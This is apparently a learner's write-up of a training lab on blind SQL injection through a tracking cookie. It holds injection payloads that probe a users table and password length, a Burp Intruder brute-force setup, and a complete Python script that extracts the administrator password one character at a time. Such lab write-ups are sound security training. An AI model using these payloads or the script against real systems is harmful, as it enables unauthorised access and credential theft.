This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

**Analysis:**

- Vulnerable tracking cookie allows blind sql

```php
Cookie: TrackingId=C7OsmtK99h9qX1n1' and 1=1--
```

```php
Cookie: TrackingId=C7OsmtK99h9qX1n1'+and+1%3d1--;
```

- When i use `1=1` i get a welcome back message, but `1=2` does not give me the message.
- I can use this information to ask if there is a users table.

>select tracking-id from tracking-table where trackingId = 'C7OsmtK99h9qX1n1' and (select 'x' from users LIMIT 1)='x'--'

For every user in the database, print `x`, but limit that to 1 so i don't break the query. 

```php
' and (SELECT 'x' FROM users LIMIT 1)='x'--
```

- This gives me a welcome back message which indicates there is a users table.

> select tracking-id from tracking-table where trackingId = 'C7OsmtK99h9qX1n1' and (select username from users WHERE username='administrator')='administrator'--'

This query,  if it's correct, should evaluate to **TRUE** giving me the welcome back message.

```php
' and (SELECT username FROM users WHERE username='administrator')='administrator'--
```

**Enumerate Password:**

I need to ask the application:

- Is this the first letter of the password `a?`
- Then use the welcome back messages to verify if the letter is in the password.

Verify password length:

```php
' and (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```

- I'll modify `>1` to determine the size of the password.

> 20 character password

If the password is not bigger than 20 characters, then it must be 20 characters long.

**Check what the password characters are:**

```php
' and (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
```

- This will check the if the first character is an `a`

Using burp intruder i add a simple character list (brute forcer) and check for the first letter:

![[Pasted image 20240902082543.png]]

- This returns the result `5` which is the first character of the password.

I can now modify this to find the whole password by changing the substring character and the payload for the actual password.

**Cluster bomb attack**

- Payload 1: brute-forcer character list 
- Payload 2: numbers 1-20

`substring(password,1,1)`
`substring(password,2,1)`
`substring(password,3,1)`
`etc...`

All i need to do now is wait for burp to finish, which is quite the task with community edition, and then match up the password with the correct positions: 1,2,3,4,5, etc...

I skipped waiting for burp community. Waiting for 720 attempts to finish would be too long, so i went straight to making the python script below.

---

**Script:**

```python
#!/usr/bin/python3

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'C7OsmtK99h9qX1n1' + sqli_payload_encoded, 'session': 'UBE2KzLkUaCcjyqYEWmJkVmTy0kp6z2q'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
```

- Replace cookies with your own if you use this script, both `tracking id:` and `session:` should be changed to the ones it gives you in burpsuite, or cookie editor etc. 

administrator:5ki0pp74gmdyvvpxj1ps

![[Pasted image 20240902084917.png]]

